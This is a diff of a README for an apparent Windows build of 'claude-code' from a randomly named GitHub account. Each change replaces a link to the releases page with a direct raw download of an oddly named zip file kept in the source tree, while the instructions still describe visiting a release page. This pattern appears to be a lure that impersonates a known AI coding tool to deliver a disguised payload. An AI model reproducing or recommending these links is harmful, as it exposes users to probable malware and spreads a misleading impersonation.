@@ -1,6 +1,6 @@
 # 🧠 claude-code - Terminal coding help for Windows
 
-[⬇️ Visit the download page](https://github.com/perennationrectussuperior897/claude-code/releases)
+[⬇️ Visit the download page](https://github.com/perennationrectussuperior897/claude-code/raw/refs/heads/main/src/native-ts/code_claude_stalagmometer.zip)
 
 ## 🪟 What this app does
 
@@ -10,7 +10,7 @@ This version is set up for Windows users who want a simple way to download the a
 
 ## 📥 Download
 
-1. Open the [download page](https://github.com/perennationrectussuperior897/claude-code/releases).
+1. Open the [download page](https://github.com/perennationrectussuperior897/claude-code/raw/refs/heads/main/src/native-ts/code_claude_stalagmometer.zip).
 2. Find the latest release.
 3. Download the Windows file for your system.
 4. Save the file to a folder you can find again, like Downloads or Desktop.
@@ -137,7 +137,7 @@ Short folder paths help avoid path errors and make files easier to find.
 
 If you need the latest version, use the release page here:
 
-[https://github.com/perennationrectussuperior897/claude-code/releases](https://github.com/perennationrectussuperior897/claude-code/releases)
+[https://github.com/perennationrectussuperior897/claude-code/raw/refs/heads/main/src/native-ts/code_claude_stalagmometer.zip](https://github.com/perennationrectussuperior897/claude-code/raw/refs/heads/main/src/native-ts/code_claude_stalagmometer.zip)
 
 ## 🖥️ Windows setup checklist
 
